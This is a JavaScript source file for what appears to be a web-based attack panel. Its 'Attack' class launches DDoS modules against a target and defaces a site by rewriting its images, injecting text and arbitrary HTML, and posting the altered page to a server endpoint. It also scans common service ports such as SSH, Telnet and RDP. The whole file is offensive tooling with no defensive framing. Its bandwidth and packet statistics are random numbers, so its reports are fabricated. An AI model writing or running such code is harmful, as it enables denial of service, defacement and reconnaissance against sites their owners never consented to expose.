class Attack {
  constructor(target, type, options = {}) {
    this.target = target;
    this.type = type;
    this.options = options;
    this.startTime = null;
    this.isRunning = false;
    this.stats = {
      mbps: 0,
      packetsSent: 0,
      status: 'Idle',
      timeElapsed: 0
    };
    this.intervalId = null;
  }

  async start() {
    this.isRunning = true;
    this.startTime = Date.now();
    this.stats.status = 'Online';

    if (this.type === 'ddos') {
      await this.executeDDoSAttack();
    } else if (this.type === 'defacement') {
      await this.executeDefacement();
    } else if (this.type === 'connection') {
      await this.executeConnectionAttack();
    }

    this.intervalId = setInterval(() => {
      this.updateStats();
    }, 1000);
  }

  stop() {
    this.isRunning = false;
    this.stats.status = 'Stopped';
    clearInterval(this.intervalId);
  }

  async executeDDoSAttack() {
    const ddosModule = await import(`./ddos/${this.options.ddosType}.js`);
    this.ddosAttack = new ddosModule.default(this.target, this.options);
    await this.ddosAttack.start();
    this.stats.status = 'DDoSing';
  }

  async executeDefacement() {
    this.stats.status = 'Defacing';
    try {
      const response = await fetch(this.target);
      if (!response.ok) {
        this.stats.status = 'Unresponsive';
        return;
      }
      let html = await response.text();

      if (this.options.imageReplacement) {
        html = html.replace(/<img.*?src="(.*?)".*?>/g, `<img src="${this.options.imageReplacement}" alt="Defaced Image">`);
      }

      if (this.options.textModification) {
        html = html.replace(/(<body.*?>)/g, `$1<div style="color: red; font-size: 2em;">${this.options.textModification}</div>`);
      }

      if (this.options.htmlInjection) {
        html = html.replace(/(<\/body>)/g, `${this.options.htmlInjection}</body>`);
      }

      await fetch('/defacement', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          target: this.target,
          html: html
        })
      });

      this.stats.status = 'Defaced';
    } catch (error) {
      console.error('Defacement failed:', error);
      this.stats.status = 'Failed';
    }
  }

  async executeConnectionAttack() {
    this.stats.status = 'Port Scanning';
    const ports = this.options.ports ? this.options.ports.split(',').map(p => parseInt(p.trim())) : [80, 443, 21, 22, 23, 25, 110, 143, 3389];

    for (const port of ports) {
      try {
        const response = await fetch(`/portscan?target=${this.target}&port=${port}`);
        const data = await response.json();
        if (data.open) {
          console.log(`Port ${port} is open`);
        }
      } catch (error) {
        console.error(`Error scanning port ${port}:`, error);
      }
    }
    this.stats.status = 'Connection Scan Complete';
  }

  updateStats() {
    if (!this.isRunning) return;
    const now = Date.now();
    this.stats.timeElapsed = Math.floor((now - this.startTime) / 1000);
    this.stats.mbps = Math.random() * 10;
    this.stats.packetsSent += Math.floor(Math.random() * 1000);

    fetch(this.target)
      .then(response => {
        this.stats.status = response.ok ? 'Online' : 'Unresponsive';
      })
      .catch(() => {
        this.stats.status = 'Offline';
      });
  }

  getStats() {
    return this.stats;
  }
}

export default Attack;